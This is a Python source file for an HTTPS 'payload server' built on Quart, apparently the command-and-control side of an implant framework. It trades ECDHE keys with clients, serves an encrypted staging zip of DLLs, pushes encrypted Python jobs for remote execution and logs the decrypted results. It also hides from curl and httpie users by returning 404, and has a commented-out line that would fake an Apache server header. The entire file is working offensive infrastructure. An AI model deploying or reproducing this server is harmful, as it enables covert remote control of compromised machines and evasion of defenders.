"""
usage: server.py [-h] [-d] [--regen-cert] <bindip> <port>

arguments:
  bindip    port to bind to
  port      port to bind to

options:
  -h, --help    show this screen
  -d, --debug   show debug output
  --regen-cert  regenerate TLS certificate
"""

import ssl
import asyncio
import logging
import os
import sys
from docopt import docopt
from core.crypto import ECDHE, create_self_signed_cert
from zipfile import ZipFile, ZIP_DEFLATED
from quart import Quart, Blueprint, request, jsonify, Response
from quart.logging import default_handler, serving_handler


class PayloadServer:
    def __init__(self):
        self.ecdhe = None

    async def key_exchange(self):
        peer_pubkey = await request.data
        self.ecdhe = ECDHE(peer_pubkey)

        return self.ecdhe.public_key, 200

    async def stage(self):
        with open('./data/stage.zip', 'rb') as stage_zip:
            logging.warning('Encrypting stage zip file')
            encrypted_stage = self.ecdhe.encrypt(stage_zip.read())
            logging.info(f"Sending stage ({os.path.getsize('./data/stage.zip')} bytes) ->  {request.remote_addr} ...")
            return Response(encrypted_stage, content_type='application/octet-stream')

    async def job(self):
        logging.debug('Compressing job')
        with ZipFile('./data/job.zip', 'w', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
            zip_file.write('./jobs/main.py', arcname='./main.py')

        with open('./data/job.zip', 'rb') as job_zip:
            logging.warning('Encrypting job')
            encrypted_job = self.ecdhe.encrypt(job_zip.read())
            logging.info(f"Sending job ({os.path.getsize('./data/job.zip')} bytes) ->  {request.remote_addr} ...")
            return Response(encrypted_job, content_type='application/octet-stream')

    async def job_result(self):
        data = await request.data
        decrypted_result = self.ecdhe.decrypt(data)
        logging.info('Decrypted results')
        logging.info(decrypted_result.decode().strip('\r\n'))

        return '', 200

####################################################################################################################


async def unknown_path(path):
    logging.error(f"Unknown path: {path}")
    return '', 404


async def check_if_naughty():
    try:
        headers = request.headers['User-Agent'].lower()
        if 'curl' in headers or 'httpie' in headers:
            return '', 404
    except KeyError:
        pass


async def make_normal(response):
    #response.headers["server"] = "Apache/2.4.35"
    return response


if __name__ == "__main__":

    args = docopt(__doc__)

    logging.basicConfig(
        format="%(asctime)s %(process)d %(threadName)s - [%(levelname)s] %(filename)s: %(funcName)s - %(message)s",
        level=logging.DEBUG if args['--debug'] else logging.INFO
    )

    logging.debug(args)

    if not os.path.exists('./data/cert.pem') or not os.path.exists('./data/key.pem') or args['--regen-cert']:
        create_self_signed_cert()

    '''
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_COMPRESSION
    ssl_context.set_ciphers('ECHDE+AESGCM:ECDH+AES')
    ssl_context.load_cert_chain(certfile='./data/cert.pem', keyfile='./data/key.pem')
    ssl_context.set_alpn_protocols(['http/1.1', 'h2'])  # accept http1 and http2 connections
    '''

    #loop = asyncio.get_event_loop()

    http_blueprint = Blueprint(__name__, 'http')
    http_blueprint.before_request(check_if_naughty)
    http_blueprint.after_request(make_normal)

    server = PayloadServer()
    http_blueprint.add_url_rule('/exchange', 'key_exchange', server.key_exchange, methods=['POST'])
    http_blueprint.add_url_rule('/stage', 'stage', server.stage, methods=['GET'])
    http_blueprint.add_url_rule('/job', 'job', server.job, methods=['GET'])
    http_blueprint.add_url_rule('/job', 'job_result', server.job_result, methods=['POST'])

    # Add a catch all route
    http_blueprint.add_url_rule('/', 'unknown_path', unknown_path, defaults={'path': ''})
    http_blueprint.add_url_rule('/<path:path>', 'unknown_path', unknown_path, methods=['GET', 'POST'])

    app = Quart(__name__)

    for logger in ['quart.app', 'quart.serving']:
        logging.getLogger(logger).setLevel(logging.DEBUG if args['--debug'] else logging.ERROR)

    logging.info('Creating stage zip file')
    with ZipFile('./data/stage.zip', 'w', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
        for f in [f for f in os.listdir('./data/') if f.endswith('.dll')]:
            zip_file.write(os.path.join('./data', f), arcname=f'./{f}')

    app.register_blueprint(http_blueprint)
    app.run(
        host=args['<bindip>'],
        port=args['<port>'],
        debug=False,
        certfile='./data/cert.pem',
        keyfile='./data/key.pem',
        #ssl=ssl_context,
        use_reloader=False,
        access_log_format='%(h)s %(p)s - - %(t)s statusline: "%(r)s" statuscode: %(s)s responselen: %(b)s protocol: %(H)s'
    )
